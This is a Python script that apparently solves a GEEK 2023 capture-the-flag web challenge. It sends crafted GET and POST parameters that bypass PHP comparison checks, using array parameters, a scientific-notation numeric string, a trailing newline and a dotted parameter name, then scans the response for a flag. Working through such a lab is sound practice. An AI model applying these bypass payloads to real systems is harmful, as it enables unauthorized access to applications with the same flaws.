import urllib.request, re, html as _html

url = 'http://80-2005f10e-b861-4aa9-8f0c-bc279804f290.challenge.ctfplus.cn'
base = url + '?syc=Welcome+to+GEEK+2023%21%0a&lover=2022e1'

# Send all layers correctly, dump full response
body = (
    b'qw[]=a&yxx[]=b'
    b'&SYC_GEEK.2023=Happy+to+see+you%21'
)
req = urllib.request.Request(base, data=body, headers={
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'
})
resp = urllib.request.urlopen(req, timeout=10)
raw = resp.read().decode('utf-8', errors='replace')

# Save full response
with open('full_response.html', 'w', encoding='utf-8') as f:
    f.write(raw)

# Also show the raw PHP output section
# Check if flag.php leaks via include_once
# The flag.php might output something during include
print(f"Full body length: {len(raw)}")
print(f"Content-Type: {resp.headers.get('Content-Type', '')}")

# Look at the raw text after PHP code ends
clean = _html.unescape(re.sub(r'<[^>]+>', '', raw))
idx = clean.find('?>')
if idx > 0:
    # Everything after the closing PHP tag
    after_php = clean[idx+2:]
    print(f"After PHP code ({len(after_php)} chars):")
    print(repr(after_php.replace('\xa0',' ')[:500]))

# Search entire raw response for any flag
for pat in ['flag{', 'CTF{', 'Geesec{', 'GEEK{', 'ISCC{']:
    for m in re.finditer(re.escape(pat), clean):
        end = clean.find('}', m.start())
        if end > m.start():
            print(f"FLAG: {clean[m.start():end+1]}")

# Check headers for any hints
print(f"\nAll headers:")
for k, v in resp.headers.items():
    print(f"  {k}: {v}")
